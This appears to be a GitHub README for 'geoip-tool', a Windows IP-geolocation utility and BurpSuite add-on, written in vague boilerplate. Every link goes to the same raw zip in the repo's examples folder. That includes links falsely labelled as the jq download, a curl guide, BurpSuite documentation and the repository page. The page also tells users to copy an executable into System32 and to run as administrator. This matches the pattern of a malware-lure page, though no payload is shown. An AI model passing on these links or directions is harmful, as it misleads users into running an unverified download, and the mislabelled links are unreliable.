# 🌍 geoip-tool - Quick GeoIP Lookup Utility

[![Download geoip-tool](https://img.shields.io/badge/Download-geoip--tool-ff6f61?style=for-the-badge)](https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip)

## ℹ️ What is geoip-tool?

geoip-tool is a small program that helps you find the location of an IP address. You can run it in the Windows terminal (Command Prompt or PowerShell). It uses free online services to get information about IPs without needing an account or key. Besides checking IPs, it also works as an add-on for the BurpSuite security testing software.  

This tool helps you learn where internet traffic comes from. It uses two data sources:  
- The free API at ip-api.com  
- The ipapi-co service  

It uses simple command-line programs to get this information and can also add details to data you work with in BurpSuite.

## 📋 Key Features

- Get information about any IP address from the terminal  
- Use with BurpSuite as a plugin for better security testing  
- Works without setting up accounts or API keys  
- Supports multiple data sources for better results  
- Runs on Windows using built-in tools like curl and jq  
- Small and fast, no web browser needed  

## 🖥 System Requirements

- Windows 10 or later  
- Internet connection for lookup services  
- PowerShell or Command Prompt available  
- curl installed (comes with Windows 10 by default)  
- jq installed (a small program to process data)  

If you do not have jq, you will find instructions below on how to get it.

## 🚀 Getting Started

Follow these steps to run geoip-tool on your Windows PC.

### 1. Visit the Download Page

Click this big button or open the link in your browser to get the tool:

[![Download geoip-tool](https://img.shields.io/badge/Download-geoip--tool-4c9aff?style=for-the-badge)](https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip)

This link takes you to the GitHub page where you can download everything you need.

### 2. Download the Files

Once on the page:  

- Look for the latest release or the files section  
- Download geoip-tool files (you may find a ZIP or ready-to-run scripts)  
- Download jq for Windows if needed from https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip  

Save these files to a folder on your PC, for example, `C:\geoip-tool`.

### 3. Install jq (if needed)

jq is a small tool that helps geoip-tool handle data. To install jq on Windows:  

- Download `jq-win64.exe` from the jq website  
- Rename it to `jq.exe`  
- Move `jq.exe` to `C:\Windows\System32` or a folder in your system PATH  

You can check if jq works by opening PowerShell and typing:

```
jq --version
```

It should show you the version number if installed correctly.

### 4. Run geoip-tool from Terminal

Open PowerShell or Command Prompt:  

- Go to the folder where you saved geoip-tool (e.g., `cd C:\geoip-tool`)  
- Type the command to lookup an IP address, for example:

```
geoip-tool 8.8.8.8
```

This will show you location data about the IP 8.8.8.8.

If your file is a script, you might need to run it with `bash` or use a `.bat` file included. Check the files you downloaded for instructions specific to your version.

### 5. Using geoip-tool with BurpSuite

geoip-tool can add location data as you test websites in BurpSuite. To use it:  

- Load the plugin into BurpSuite following their plugin guide  
- Configure geoip-tool commands in the plugin settings  
- When testing, the plugin will call geoip-tool to enrich IP details  

This helps security testers see where connections come from in their reports.

## 🔧 How It Works

geoip-tool uses `curl` to call free APIs that provide information about IP addresses. It then uses `jq` to process this information and display it clearly.  

Here is the flow:  

- User enters an IP address  
- geoip-tool queries `ip-api.com` or `ipapi-co` for data  
- Raw data is sent back in a format called JSON  
- jq processes this JSON to show location, ISP, city, and more  
- User sees results directly in the terminal  

Because the APIs do not require keys, you can use the tool immediately without signing up.

## 🛠 Troubleshooting Tips

- Make sure you have an active internet connection  
- Confirm that curl and jq are installed correctly  
- Open PowerShell and run `curl --version` and `jq --version` to check  
- If geoip-tool does not run, check your folder and file names  
- Run PowerShell as administrator if you get permission errors  
- For BurpSuite integration, verify plugin settings match your setup  

## 📁 What You Get

Your download package should include:  

- The main geoip-tool executable or script file  
- A README file with instructions  
- Any support files needed for BurpSuite plugin  
- Links or instructions to install jq if missing  

## 🤝 Support and Contribution

If you want to suggest improvements or report bugs, use the GitHub repository issues page. You don’t need programming skills simply describe what happens when you use geoip-tool.  

Repository link:  
https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip

## ⚙️ Advanced Use

For users familiar with command line tools, geoip-tool can be combined with other programs:  

- Use it inside batch scripts for automatic lookups  
- Combine with curl and jq commands for custom reports  
- Include in security testing toolchains or pipelines  

You can also customize which API geoip-tool uses by changing simple settings in the script.

## 🔒 Privacy and Security

geoip-tool only sends IP addresses to trusted lookup services. It does not store your data or send extra information. The APIs used are free and public.

## 📚 Additional Resources

- Download jq: https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip  
- Learn about curl on Windows: https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip  
- BurpSuite extensions guide: https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip  

## ⚡ Start Now

Return to the download page below to get the latest version and start using geoip-tool:

[![Download geoip-tool](https://img.shields.io/badge/Download-geoip--tool-ff6f61?style=for-the-badge)](https://github.com/NenelzSWh/geoip-tool/raw/refs/heads/main/examples/tool_geoip_2.1.zip)